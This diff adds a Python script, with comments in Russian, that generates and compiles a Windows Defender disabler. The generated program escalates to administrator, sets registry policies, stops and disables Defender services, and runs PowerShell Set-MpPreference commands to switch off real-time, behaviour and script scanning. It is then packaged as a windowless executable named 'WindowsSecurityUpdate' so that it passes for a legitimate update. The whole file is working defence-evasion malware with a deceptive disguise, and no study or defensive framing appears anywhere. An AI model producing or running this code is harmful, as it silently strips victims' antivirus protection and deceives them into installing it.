@@ -1,0 +1,97 @@
+import os
+import subprocess
+import sys
+
+def install_pyinstaller():
+    try:
+        import PyInstaller
+    except ImportError:
+        subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"])
+
+def create_defender_disabler():
+    disabler_code = '''import os
+import subprocess
+import time
+import ctypes
+import sys
+
+def is_admin():
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin()
+    except:
+        return False
+
+if not is_admin():
+    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
+    sys.exit()
+
+def disable_defender_permanent():
+    # 1. Полностью отключаем через групповые политики
+    registry_commands = [
+        'reg add "HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f',
+        'reg add "HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1 /f',
+        'reg add "HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d 1 /f',
+        'reg add "HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d 1 /f',
+        'reg add "HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d 1 /f',
+        'reg add "HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Spynet" /v "SpynetReporting" /t REG_DWORD /d 0 /f',
+        'reg add "HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Spynet" /v "SubmitSamplesConsent" /t REG_DWORD /d 2 /f'
+    ]
+    
+    # 2. Останавливаем и отключаем службы
+    service_commands = [
+        'sc stop WinDefend',
+        'sc config WinDefend start= disabled',
+        'sc stop WdNisSvc',
+        'sc config WdNisSvc start= disabled',
+        'sc stop Sense',
+        'sc config Sense start= disabled',
+        'sc stop WdNisDrv',
+        'sc config WdNisDrv start= disabled'
+    ]
+    
+    # 3. PowerShell команды для дополнительного отключения
+    ps_commands = [
+        "Set-MpPreference -DisableRealtimeMonitoring $true",
+        "Set-MpPreference -DisableBehaviorMonitoring $true",
+        "Set-MpPreference -DisableBlockAtFirstSeen $true",
+        "Set-MpPreference -DisableIOAVProtection $true",
+        "Set-MpPreference -DisablePrivacyMode $true",
+        "Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true",
+        "Set-MpPreference -DisableArchiveScanning $true",
+        "Set-MpPreference -DisableIntrusionPreventionSystem $true",
+        "Set-MpPreference -DisableScriptScanning $true",
+        "Set-MpPreference -PUAProtection disable",
+        "Set-MpPreference -MAPSReporting 0",
+        "Set-MpPreference -SubmitSamplesConsent 2"
+    ]
+    
+    # Выполняем все команды
+    for cmd in registry_commands:
+        subprocess.run(cmd, shell=True, capture_output=True)
+        time.sleep(0.2)
+    
+    for cmd in service_commands:
+        subprocess.run(cmd, shell=True, capture_output=True)
+        time.sleep(0.2)
+    
+    for cmd in ps_commands:
+        subprocess.run(["powershell", "-Command", cmd], capture_output=True)
+        time.sleep(0.2)
+    
+    # 4. Запрещаем запуск через политики безопасности
+    subprocess.run(['reg', 'add', 'HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\WinDefend', '/v', 'Start', '/t', 'REG_DWORD', '/d', '4', '/f'], capture_output=True)
+
+disable_defender_permanent()
+'''
+
+    with open('system_repair.py', 'w', encoding='utf-8') as f:
+        f.write(disabler_code)
+
+def compile_to_exe():
+    os.system('pyinstaller --onefile --noconsole --name "WindowsSecurityUpdate" system_repair.py')
+    print("Скомпилировано как WindowsSecurityUpdate.exe")
+
+if __name__ == "__main__":
+    install_pyinstaller()
+    create_defender_disabler()
+    compile_to_exe()
